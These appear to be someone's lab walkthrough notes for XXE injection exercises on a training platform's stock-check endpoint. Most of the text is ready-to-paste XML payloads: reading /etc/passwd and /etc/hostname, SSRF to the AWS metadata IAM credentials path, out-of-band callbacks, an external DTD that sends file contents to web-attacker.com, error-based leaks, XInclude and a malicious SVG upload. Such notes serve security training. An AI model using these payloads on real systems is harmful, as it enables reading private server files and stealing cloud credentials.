### Exploiting XXE using external entities to retrieve files

We see a POST request to /products/stock with a XML in the body. Add the entity creation line:
`<!DOCTYPE foo [<!ENTITY replace SYSTEM "/etc/passwd"> ]>`

And then, call it, in this case, in the productId: `&replace;`

This is the final payload:
```xml
<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE foo [<!ENTITY XXE SYSTEM "/etc/passwd"> ]>
	<stockCheck>
		<productId>
			&XXE;
		</productId>
		<storeId>
			1
		</storeId>
	</stockCheck>
```

> Bare in mind this payload may be incorrectly indented!

---
### Exploiting XXE to perform SSRF attacks

Exactly the same as the previous one, but now we try to retrieve the content of the AWS metadata with the magic IP

```xml
<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE foo [ <!ENTITY XXE SYSTEM "http://169.254.169.254/latest/meta-data/iam/security-credentials/admin"> ]>
<stockCheck>
	<productId>
		&XXE;
	</productId>
	<storeId>
		1
	</storeId>
</stockCheck>
```

---
### Blind XXE with out-of-band interaction

In this case, as you cant see the XXE injection, you can send a request to a collaborator, like this: 

```xml
<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE foo [ <!ENTITY XXE SYSTEM "https://COLLABORATOR-URL"> ]>
<stockCheck>
	<productId>
		&XXE;
	</productId>
	<storeId>
		1
	</storeId>
</stockCheck>
```

---
### Blind XXE with out-of-band interaction via XML parameter entities

Input this line after `<?xml version="1.0" encoding="UTF-8"?>` and before `<stockCheck>`.
```xml
<!DOCTYPE stockCheck [<!ENTITY % xxe SYSTEM "http://BURP-COLLABORATOR-SUBDOMAIN"> %xxe; ]>
```
The productId should not be modified.

---
### Exploiting blind XXE to exfiltrate data using a malicious external DTD

This is the body payload:
```xml
<!ENTITY % file SYSTEM "file:///etc/hostname">
<!ENTITY % eval "<!ENTITY &#x25; exfiltrate SYSTEM 'http://web-attacker.com/?x=%file;'>">
%eval;
%exfiltrate;
```

This you'll use in the repeater:
```xml
<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE foo [<!ENTITY % xxe SYSTEM "http://web-attacker.com/malicious.dtd"> %xxe;]>
<stockCheck>
	<productId>
		3
	</productId>
	<storeId>
		1
	</storeId>
</stockCheck>
```

So you are declarating a XML in you exploit server, and then you are going to look for that file in the burp repeater, by specifying the URL of the hosted file

---
### Exploiting blind XXE to retrieve data via error messages

This is the body payload:
```xml
<!ENTITY % file SYSTEM "file:///etc/passwd"> 
<!ENTITY % eval "<!ENTITY &#x25; exfil SYSTEM 'file:///invalid/%file;'>"> 
%eval;
%exfil;
```

And this is what you will put in the request:
```xml
<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE foo [<!ENTITY % xxe SYSTEM "https://exploit-0aff00db0348c53e8392732701d100d1.exploit-server.net/exploit"> %xxe;]>
<stockCheck>
	<productId>
		1
	</productId>
	<storeId>
		1
	</storeId>
</stockCheck>
```

This only can happen when you have detailed error messages after trying to get a particular file, because this will append the content of what you are trying to get to the error message.

---
### Exploiting XInclude to retrieve files

This is the payload
`productId=<foo xmlns:xi="http://www.w3.org/2001/XInclude"><xi:include parse="text" href="file:///etc/passwd"/></foo>&storeId=1&storeId=1`

---
### Exploiting XXE via image file upload

Create a SVG file with vim, and use this contnet:
`<?xml version="1.0" standalone="yes"?><!DOCTYPE test [ <!ENTITY xxe SYSTEM "file:///etc/hostname" > ]><svg width="128px" height="128px" xmlns="http://www.w3.org/2000/svg" xmlns:xlink="http://www.w3.org/1999/xlink" version="1.1"><text font-size="16" x="0" y="16">&xxe;</text></svg>`

---
